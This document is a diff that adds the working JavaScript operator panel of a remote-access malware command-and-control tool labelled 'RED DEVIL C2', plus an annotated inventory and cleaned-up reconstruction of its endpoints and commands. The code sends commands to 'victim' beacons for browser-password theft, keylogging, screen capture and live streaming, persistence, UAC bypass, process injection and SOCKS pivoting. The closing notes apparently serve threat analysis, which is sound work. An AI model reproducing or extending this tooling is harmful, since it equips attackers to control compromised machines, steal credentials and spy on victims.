+    if (msg.type === 'frame') {
+      if (currentViewCid && msg.cid === currentViewCid) {
+        document.getElementById('liveImg').src = 'data:image/jpeg;base64,' + msg.data;
+        _liveFrames++;
+        const now = Date.now();
+        if (now - _liveLast >= 1000) { _liveFps = _liveFrames; _liveFrames = 0; _liveLast = now;
+          document.getElementById('liveFps').textContent = _liveFps + ' fps'; }
+      }
+      return;
+    }
+    if (msg.type === 'output') {
+      addLog(msg.data);
+      if (currentViewCid) {
+        const m = msg.data.match(/^\[#\d+\] \[STRM:(OUT|ERR):\d+\] ([\s\S]*)$/);
+        if (m) appendDevOutput('<span style="color:' + (m[1]==='ERR' ? '#ff3355' : '#ff8a5a') + '">' + esc(m[2]) + '</span>');
+        else appendDevOutput(msg.data);
+        if (/^\s*\d+\s+[\d.]+\s+[\d.]+\s+\S+\s+.+$/m.test(msg.data)) injRefresh(msg.data);
+      }
+    }
+    if (msg.type === 'alert') { showAlert(msg.title, msg.body, msg.severity); }
+  };
+  ws.onclose = () => { setTimeout(initWS, 3000); };
+  ws.onerror = () => { ws.close(); };
+}
+function showPanel(name) {
+  document.querySelectorAll('.sidebar .icon').forEach(i => i.classList.remove('active'));
+  document.getElementById('icoDash').classList.toggle('active', name==='dashboard');
+  document.getElementById('icoLog').classList.toggle('active', name==='log');
+  document.getElementById('icoFiles').classList.toggle('active', name==='files');
+  document.getElementById('dashboardPanel').style.display = 'none';
+  document.getElementById('deviceView').style.display = 'none';
+  document.getElementById('logPanel').style.display = 'none';
+  document.getElementById('filesPanel').style.display = 'none';
+  if (name==='dashboard') {
+    document.getElementById('dashboardPanel').style.display = 'block';
+    document.getElementById('backBtn').style.display = 'none';
+    document.getElementById('mainTitle').textContent = "JOD'S RED ROOM // RED DEVIL";
+    document.getElementById('search').style.display = 'inline';
+    currentViewCid = null;
+  } else if (name==='log') {
+    document.getElementById('logPanel').style.display = 'flex';
+    document.getElementById('backBtn').style.display = 'none';
+    document.getElementById('mainTitle').textContent = 'ACTIVITY LOG';
+    document.getElementById('search').style.display = 'none';
+    currentViewCid = null;
+  } else if (name==='files') {
+    document.getElementById('filesPanel').style.display = 'flex';
+    document.getElementById('backBtn').style.display = 'none';
+    document.getElementById('mainTitle').textContent = 'CAPTURED FILES';
+    document.getElementById('search').style.display = 'none';
+    currentViewCid = null;
+    loadFiles();
+  }
+}
+function backToDashboard() { showPanel('dashboard'); }
+function openDeviceView(cid) {
+  currentViewCid = cid;
+  document.getElementById('dashboardPanel').style.display = 'none';
+  document.getElementById('deviceView').style.display = 'flex';
+  document.getElementById('backBtn').style.display = 'inline';
+  document.getElementById('mainTitle').textContent = 'DEVICE DETAILS';
+  document.getElementById('search').style.display = 'none';
+  document.getElementById('termHost').textContent = (clients[cid] && clients[cid].hostname) || '?';
+  document.getElementById('liveCard').style.display = 'block';
+  document.getElementById('liveRaw').href = '/api/live/' + cid + '?token=' + encodeURIComponent(token);
+  renderDeviceView(cid);
+}
+function renderDeviceView(cid) {
+  const c = clients[cid];
+  if (!c) { backToDashboard(); return; }
+  const name = c.name || c.hostname || 'Client #' + cid;
+  const osDisplay = (c.os || '?').split(' ').slice(0,2).join(' ');
+  const tags = (c.tags || []).map(t => '<span class="badge tag">' + esc(t) + '</span>').join('');
+  document.getElementById('devHeader').innerHTML = `
+    <div class="d-top">
+      <div class="d-name">&#9760; ${esc(name)}</div>
+      <div class="d-cid">#${cid}</div>
+    </div>
+    <div class="d-info">
+      <span><span class="lbl">OS:</span> ${esc(osDisplay)}</span>
+      <span><span class="lbl">IP:</span> ${esc(c.ip||'?')}</span>
+      <span><span class="lbl">User:</span> ${esc(c.username||'?')}</span>
+      <span><span class="lbl">Arch:</span> ${esc(c.arch||'?')}</span>
+    </div>
+    <div class="badges">${tags}</div>
+    <div class="d-actions">
+      <button class="da-btn" onclick="quickCmd('whoami')">&#128100; whoami</button>
+      <button class="da-btn" onclick="quickCmd('exec ipconfig')">&#127760; ipconfig</button>
+      <button class="da-btn" onclick="quickCmd('sysinfo')">&#8505; sysinfo</button>
+      <button class="da-btn" onclick="quickCmd('screenshot')">&#128247; Screenshot</button>
+      <button class="da-btn" onclick="quickCmd('browser-creds')">&#128273; Passwords</button>
+      <button class="da-btn" onclick="quickCmd('persist')">&#128170; Persist</button>
+      <button class="da-btn danger" onclick="if(confirm('Uninstall from victim?'))quickCmd('uninstall')">&#128465; Uninstall</button>
+    </div>`;
+}
+function quickCmd(cmd) {
+  if (!currentViewCid) return;
+  appendDevOutput('&#9654; <span class="do-cmd">' + esc(cmd) + '</span>');
+  sendCmdToClient(currentViewCid, cmd);
+}
+function sendCustomCmd() {
+  const cmd = document.getElementById('customCmd').value.trim();
+  if (!cmd || !currentViewCid) return;
+  appendDevOutput('&#9654; <span class="do-cmd">' + esc(cmd) + '</span>');
+  sendCmdToClient(currentViewCid, cmd);
+  document.getElementById('customCmd').value = '';
+}
+function sendCmdToClient(cid, cmd) {
+  if (ws && ws.readyState === WebSocket.OPEN) {
+    ws.send(JSON.stringify({type: 'cmd', client: cid, command: cmd}));
+  } else {
+    fetch('/api/command', {
+      method: 'POST',
+      headers: {'Content-Type':'application/json', 'Authorization':'Bearer '+token},
+      body: JSON.stringify({client_id: cid, command: cmd})
+    }).catch(e => appendDevOutput('&#10007; Error: ' + e));
+  }
+}
+function appendDevOutput(text) {
+  const box = document.getElementById('devOutput');
+  const t = new Date().toLocaleTimeString();
+  const cursor = box.querySelector('.cursor-line');
+  if (cursor) cursor.remove();
+  box.innerHTML += '<div class="do-line"><span class="do-ts">['+t+']</span> ' + text + '</div>';
+  box.insertAdjacentHTML('beforeend', '<div class="cursor-line">&#9611;</div>');
+  box.scrollTop = box.scrollHeight;
+}
+let termHist = [], termHi = -1;
+function termSend(){
+  const inp = document.getElementById('termInput');
+  const cmd = inp.value.trim();
+  if (!cmd || !currentViewCid) return;
+  termHist.push(cmd); termHi = termHist.length;
+  appendDevOutput('&#9654; <span class="do-cmd">' + esc(cmd) + '</span>');
+  sendCmdToClient(currentViewCid, cmd);
+  inp.value = '';
+}
+document.addEventListener('keydown', function(e){
+  const inp = document.getElementById('termInput');
+  if (!inp || document.activeElement !== inp) return;
+  if (e.key === 'Enter') { e.preventDefault(); termSend(); }
+  else if (e.key === 'ArrowUp') { e.preventDefault(); if (termHi > 0) { termHi--; inp.value = termHist[termHi] || ''; } }
+  else if (e.key === 'ArrowDown') { e.preventDefault(); if (termHi < termHist.length) { termHi++; inp.value = termHist[termHi] || ''; } }
+  else if (e.key === 'l' && e.ctrlKey) { e.preventDefault(); document.getElementById('devOutput').innerHTML = ''; }
+});
+function render() {
+  const q = document.getElementById('search').value.toLowerCase().trim();
+  const entries = Object.entries(clients).filter(([id, c]) => {
+    if (!q) return true;
+    return (id + ' ' + (c.hostname||'') + ' ' + (c.ip||'') + ' ' + (c.name||'') + ' ' + (c.os||'') + ' ' + (c.tags||[]).join(' ')).toLowerCase().includes(q);
+  });
+  if (entries.length === 0) {
+    uc('<div style="text-align:center;padding:60px 20px;color:#5a2a2a;font-size:13px">' + (q ? 'NO MATCHES FOUND' : '&#9760; NO BEACONS CONNECTED — DEPLOY AGENTS TO BEGIN') + '</div>');
+    return;
+  }
+  let cards = [];
+  for (const [id, c] of entries) {
+    const name = c.name || c.hostname || 'Client #' + id;
+    const osDisplay = (c.os || '?').split(' ').slice(0,2).join(' ');
+    const tags = (c.tags || []).map(t => '<span class="badge tag">' + esc(t) + '</span>').join('');
+    const featBadges = [];
+    if ((c.features||{}).webcam) featBadges.push('<span class="badge">&#128247; Webcam</span>');
+    if ((c.features||{}).keylogger) featBadges.push('<span class="badge">&#9000; Keys</span>');
+    cards.push('<div class="card" data-cid="'+id+'" oncontextmenu="showCtx(event,'+id+')" onclick="openDeviceView('+id+')">' +
+      '<span class="led"></span>' +
+      '<div class="top"><div class="hostname">'+esc(name)+'</div><div class="cid">#'+id+'</div></div>' +
+      '<div class="info"><span><span class="label">&#128421;</span> '+esc(osDisplay)+'</span>' +
+      '<span><span class="label">&#127760;</span> '+esc(c.ip||'?')+'</span>' +
+      '<span><span class="label">&#128100;</span> '+esc(c.username||'?')+'</span>' +
+      '<span><span class="label">&#9001;</span> '+esc(c.arch||'?')+'</span></div>' +
+      '<div class="badges">'+featBadges.join('')+tags+'</div></div>');
+  }
+  uc(cards.join(''));
+}
+function updateStats() {
+  const n = Object.keys(clients).length;
+  document.getElementById('statBar').innerHTML = '<b>'+n+'</b> beacon' + (n===1?'':'s') + ' // <b>'+_uptime()+'</b> session';
+}
+function _uptime() {
+  const s = Math.floor((Date.now() - _sessionStart) / 1000);
+  const h = String(Math.floor(s/3600)).padStart(2,'0');
+  const m = String(Math.floor((s%3600)/60)).padStart(2,'0');
+  const sec = String(s%60).padStart(2,'0');
+  return h+':'+m+':'+sec;
+}
+setInterval(updateStats, 1000);
+function showCtx(e, cid) {
+  e.preventDefault(); ctxCid = cid; const m = document.getElementById('ctxMenu');
+  m.style.display = 'block'; m.style.left = Math.min(e.clientX, window.innerWidth - 190) + 'px';
+  m.style.top = Math.min(e.clientY, window.innerHeight - 170) + 'px';
+}
+document.addEventListener('click', () => { document.getElementById('ctxMenu').style.display = 'none'; });
+function openModal(id) { document.getElementById(id).classList.add('show'); }
+function closeModal(id) { document.getElementById(id).classList.remove('show'); }
+function ctxView() { if (ctxCid) openDeviceView(ctxCid); }
+function ctxCmd() { openModal('cmdModal'); document.getElementById('cmdInput').value = ''; setTimeout(()=>document.getElementById('cmdInput').focus(),100); }
+function ctxRename() { openModal('renameModal'); document.getElementById('renameInput').value = ''; }
+function ctxNotes() { openModal('notesModal'); document.getElementById('notesInput').value = (clients[ctxCid]||{}).notes||''; }
+function ctxTags() { openModal('tagsModal'); document.getElementById('tagsInput').value = ((clients[ctxCid]||{}).tags||[]).join(', '); }
+function ctxDelete() { if (ctxCid) { document.getElementById('delCid').textContent = '#' + ctxCid; openModal('delModal'); } }
+async function api(url, body) {
+  const r = await fetch(url, { method:'POST', headers:{'Content-Type':'application/json','Authorization':'Bearer '+token}, body:JSON.stringify(body) });
+  return r.json();
+}
+async function doRename() {
+  const name = document.getElementById('renameInput').value.trim();
+  if (!name) return; closeModal('renameModal');
+  if (clients[ctxCid]) clients[ctxCid].name = name;
+  if (currentViewCid == ctxCid) renderDeviceView(ctxCid);
+  render(); await api('/api/rename', {client_id: ctxCid, name});
+}
+async function doNotes() {
+  const notes = document.getElementById('notesInput').value; closeModal('notesModal');
+  if (clients[ctxCid]) clients[ctxCid].notes = notes;
+  if (currentViewCid == ctxCid) renderDeviceView(ctxCid);
+  render(); await api('/api/notes', {client_id: ctxCid, notes});
+}
+async function doTags() {
+  const raw = document.getElementById('tagsInput').value;
+  const tags = raw.split(',').map(t=>t.trim()).filter(Boolean); closeModal('tagsModal');
+  if (clients[ctxCid]) clients[ctxCid].tags = tags;
+  if (currentViewCid == ctxCid) renderDeviceView(ctxCid);
+  render(); await api('/api/tags', {client_id: ctxCid, tags});
+}
+async function doCmd() {
+  const cmd = document.getElementById('cmdInput').value;
+  if (!cmd) return; closeModal('cmdModal');
+  addLog('Sending to #' + ctxCid + ': ' + cmd);
+  await api('/api/command', {client_id: ctxCid, command: cmd});
+}
+async function doDelete() {
+  closeModal('delModal'); const cid = ctxCid; delete clients[cid];
+  if (currentViewCid == cid) backToDashboard();
+  render(); updateStats(); await api('/api/delete-client', {client_id: cid});
+}
+function addLog(text) {
+  const box = document.getElementById('logBox');
+  const t = new Date().toLocaleTimeString();
+  box.innerHTML += '<div class="line"><span>['+t+']</span> ' + text + '</div>';
+  box.scrollTop = box.scrollHeight;
+}
+async function loadFiles() {
+  try {
+    const r = await fetch('/files', {headers:{'Authorization':'Bearer '+token}});
+    const h = await r.text();
+    document.getElementById('filesBox').innerHTML = h;
+    document.getElementById('fileCount').textContent = (h.match(/<div class="card"/g)||[]).length;
+  } catch(e) {}
+}
+function showAlert(title, body, severity) {
+  const c = document.getElementById('alertContainer')||(document.body.appendChild(Object.assign(document.createElement('div'),{id:'alertContainer',className:'alert-container'})));
+  const a = document.createElement('div'); a.className = 'alert';
+  a.innerHTML = '<div class="title '+(severity||'info')+'">'+esc(title)+'</div><div class="body">'+esc(body)+'</div>';
+  c.appendChild(a);
+  setTimeout(()=>{a.style.opacity='0';a.style.transition='opacity .3s';setTimeout(()=>a.remove(),300)},4200);
+}
+/* ---- RED PARTICLE FIELD ---- */
+(function(){
+  const cv = document.getElementById('fx');
+  const ctx = cv.getContext('2d');
+  let W, H, parts = [];
+  function resize(){ W = cv.width = innerWidth; H = cv.height = innerHeight; }
+  resize(); addEventListener('resize', resize);
+  const N = Math.min(90, Math.floor(innerWidth/18));
+  for (let i=0;i<N;i++) parts.push({x:Math.random()*W, y:Math.random()*H,
+    r:Math.random()*1.8+.4, vx:(Math.random()-.5)*.35, vy:Math.random()*.55+.12,
+    a:Math.random()*.5+.15});
+  (function tick(){
+    ctx.clearRect(0,0,W,H);
+    for (const p of parts){
+      p.x+=p.vx; p.y+=p.vy;
+      if (p.y>H){p.y=-4;p.x=Math.random()*W;}
+      if (p.x>W)p.x=0; if (p.x<0)p.x=W;
+      ctx.beginPath(); ctx.arc(p.x,p.y,p.r,0,6.283);
+      ctx.fillStyle='rgba(255,26,26,'+p.a+')';
+      ctx.fill();
+    }
+    requestAnimationFrame(tick);
+  })();
+})();
+let _liveFrames = 0, _liveFps = 0, _liveLast = Date.now();
+function liveRestart(){
+  if(!currentViewCid) return;
+  sendCmdToClient(currentViewCid, 'sstream stop');
+  setTimeout(()=>{
+    const q = document.getElementById('liveQ').value;
+    const i = document.getElementById('liveI').value;
+    sendCmdToClient(currentViewCid, 'sstream start ' + i + ' ' + q);
+  }, 400);
+}
+function injRefresh(text){
+  const sel = document.getElementById('injPid');
+  if(!sel) return;
+  const seen = new Set(Array.from(sel.options).map(o=>o.value));
+  const re = /^\s*(\d+)\s+([\d.]+)\s+([\d.]+)\s+(\S+)\s+(.+)$/gm;
+  let m;
+  while((m = re.exec(text))){
+    const pid = m[1], name = m[5];
+    if(!seen.has(pid)){
+      const o = document.createElement('option');
+      o.value = pid;
+      o.textContent = pid + ' · ' + name + ' (' + m[2] + '% mem)';
+      sel.appendChild(o);
+      seen.add(pid);
+    }
+  }
+}
+function injTest(){
+  const pid = document.getElementById('injPid').value;
+  const method = document.getElementById('injMethod').value;
+  if(!pid){ alert('pehle ps chalao aur PID pick karo'); return; }
+  const hex = 'EBFE'; // x64 infinite loop (jmp $) — harmless test
+  appendDevOutput('&#9654; <span class="do-cmd">inject ' + pid + ' ' + method + ' ' + hex + '</span>');
+  sendCmdToClient(currentViewCid, 'inject ' + pid + ' ' + method + ' ' + hex);
+}
+if (token) { initWS(); }
+document.getElementById('pwd').focus();
+</script></body></html>
+
+<!--
+Adventures of Derp
+
+RED DEVIL C2 / JOD'S RED ROOM operator panel
+
+Self-label:
+  JOD'S RED ROOM
+  RED DEVIL COMMAND & CONTROL
+  v7.3-CS
+
+Operator authentication:
+
+  localStorage["c2_token"]
+
+  WebSocket:
+    /ws/panel?token=<token>
+
+  REST:
+    /api/command
+    /api/rename
+    /api/notes
+    /api/tags
+    /api/delete-client
+    /api/socks
+    /api/live/<cid>
+    /files
+    /deploy
+    /dl
+
+
+WebSocket messages:
+
+  ping
+  pong
+  error
+  clients
+  frame
+  output
+  alert
+
+
+Command envelope:
+
+  {
+    "type": "cmd",
+    "client": <cid>,
+    "command": "<command>"
+  }
+
+
+Operator capabilities:
+
+  Recon:
+    whoami
+    hostname
+    exec ipconfig
+    sysinfo
+    exec whoami /groups
+    exec systeminfo
+    exec tasklist /v
+    exec net user
+
+  Harvest:
+    browser-creds
+    wifi
+    clipboard
+    screenshot
+    checkav
+
+  Persistence:
+    persist
+    uac
+
+  Keylogger:
+    keylog start
+    keylog dump
+    keylog stop
+
+  Files:
+    dir C:\Users
+    dir C:\Users\%USERNAME%\Desktop
+    dir C:\Users\%USERNAME%\Documents
+
+  Lifecycle:
+    exit
+    uninstall
+
+
+Live screen:
+
+  sstream start <interval> <quality>
+  sstream stop
+
+  /api/live/<cid>?token=<token>
+
+  WebSocket frame messages contain:
+    data:image/jpeg;base64,<frame>
+
+
+SOCKS5 pivoting:
+
+  /api/socks?token=<token>
+
+  Response fields referenced by UI:
+    listener
+    auth
+    beacons_ready
+    pivots
+    cid
+    channel
+    age
+
+  Authentication text:
+    user: nexus
+    pass: token
+
+
+Process injection UI:
+
+  Methods:
+    CreateRemoteThread
+    APC
+    Thread Hijack
+
+  Command:
+    inject <pid> <method> <hex>
+
+  Built-in test:
+    EBFE
+
+  Source comment identifies EBFE as:
+    x64 infinite loop (jmp $)
+    harmless test
+
+
+Client metadata displayed:
+
+  cid
+  hostname
+  name
+  ip
+  username
+  arch
+  os
+  tags
+
+  Feature flags:
+    webcam
+    keylogger
+
+
+Captured-file handling:
+
+  GET /files
+  Authorization: Bearer <token>
+
+
+REST command fallback:
+
+  POST /api/command
+
+  Authorization:
+    Bearer <token>
+
+  JSON:
+    {
+      "client_id": <cid>,
+      "command": "<command>"
+    }
+
+
+Strong pivots:
+
+  "JOD'S RED ROOM"
+  "RED DEVIL COMMAND & CONTROL // v7.3-CS"
+  "/ws/panel?token="
+  "c2_token"
+  "/api/socks?token="
+  "browser-creds"
+  "sstream start"
+  "keylog dump"
+  "CreateRemoteThread"
+  "Thread Hijack"
+  "user: nexus / pass: token"
+
+Additional source pivots:
+
+  "login pehle karo"
+  "koi active pivot nahi"
+  "pehle ps chalao aur PID pick karo"
+
+
+## Normalized
+-->
+
+<script>
+let clients = {};
+let token = localStorage.getItem("c2_token") || "";
+let currentViewCid = null;
+
+
+/*
+ * Operator authentication and primary C2 channel.
+ */
+
+function login() {
+    const pwd = document.getElementById("pwd").value;
+
+    if (!pwd)
+        return;
+
+    token = pwd;
+    localStorage.setItem("c2_token", token);
+
+    initWS();
+}
+
+
+function initWS() {
+    const proto =
+        location.protocol === "https:"
+            ? "wss:"
+            : "ws:";
+
+    const url =
+        proto +
+        "//" +
+        location.host +
+        "/ws/panel?token=" +
+        encodeURIComponent(token);
+
+    const ws = new WebSocket(url);
+
+    ws.onmessage = event => {
+        const msg = JSON.parse(event.data);
+
+        if (msg.type === "ping") {
+            ws.send(JSON.stringify({
+                type: "pong"
+            }));
+            return;
+        }
+
+        if (msg.type === "clients") {
+            clients = msg.data || {};
+            return;
+        }
+
+        if (msg.type === "frame") {
+            /*
+             * Live screen frame:
+             *
+             * data:image/jpeg;base64,<msg.data>
+             */
+            return;
+        }
+
+        if (msg.type === "output") {
+            /*
+             * Command output from beacon.
+             */
+            return;
+        }
+
+        if (msg.type === "alert") {
+            /*
+             * Operator alert.
+             */
+            return;
+        }
+    };
+}
+
+
+/*
+ * Command transport.
+ */
+
+function sendCmdToClient(ws, cid, command) {
+    if (ws && ws.readyState === WebSocket.OPEN) {
+        ws.send(JSON.stringify({
+            type: "cmd",
+            client: cid,
+            command: command
+        }));
+
+        return;
+    }
+
+    fetch("/api/command", {
+        method: "POST",
+
+        headers: {
+            "Content-Type": "application/json",
+            "Authorization": "Bearer " + token
+        },
+
+        body: JSON.stringify({
+            client_id: cid,
+            command: command
+        })
+    });
+}
+
+
+/*
+ * Quick-command inventory recovered from the panel.
+ */
+
+const commands = {
+    recon: [
+        "whoami",
+        "hostname",
+        "exec ipconfig",
+        "sysinfo",
+        "exec whoami /groups",
+        "exec systeminfo",
+        "exec tasklist /v",
+        "exec net user"
+    ],
+
+    harvest: [
+        "browser-creds",
+        "wifi",
+        "clipboard",
+        "screenshot",
+        "checkav"
+    ],
+
+    persistence: [
+        "persist",
+        "uac"
+    ],
+
+    keylogger: [
+        "keylog start",
+        "keylog dump",
+        "keylog stop"
+    ],
+
+    lifecycle: [
+        "exit",
+        "uninstall"
+    ]
+};
+
+
+/*
+ * Screen streaming.
+ */
+
+function startScreen(ws, cid, interval, quality) {
+    sendCmdToClient(
+        ws,
+        cid,
+        "sstream start " + interval + " " + quality
+    );
+}
+
+
+function stopScreen(ws, cid) {
+    sendCmdToClient(
+        ws,
+        cid,
+        "sstream stop"
+    );
+}
+
+
+/*
+ * Process injection controls exposed in the panel.
+ */
+
+const injectionMethods = [
+    "remote_thread",
+    "apc",
+    "hijack"
+];
+
+/*
+ * UI labels:
+ *
+ *   remote_thread -> CreateRemoteThread
+ *   apc           -> APC
+ *   hijack        -> Thread Hijack
+ *
+ * Built-in injection test payload:
+ *
+ *   EBFE
+ *
+ * Source comment:
+ *   x64 infinite loop (jmp $) - harmless test
+ */
+
+
+/*
+ * SOCKS pivot status.
+ */
+
+async function socksRefresh() {
+    const response = await fetch(
+        "/api/socks?token=" +
+        encodeURIComponent(token)
+    );
+
+    const status = await response.json();
+
+    /*
+     * Expected UI fields:
+     *
+     * status.listener
+     * status.auth
+     * status.beacons_ready
+     * status.pivots[]
+     *
+     * pivot:
+     *   cid
+     *   channel
+     *   age
+     */
+}
+
+</script>
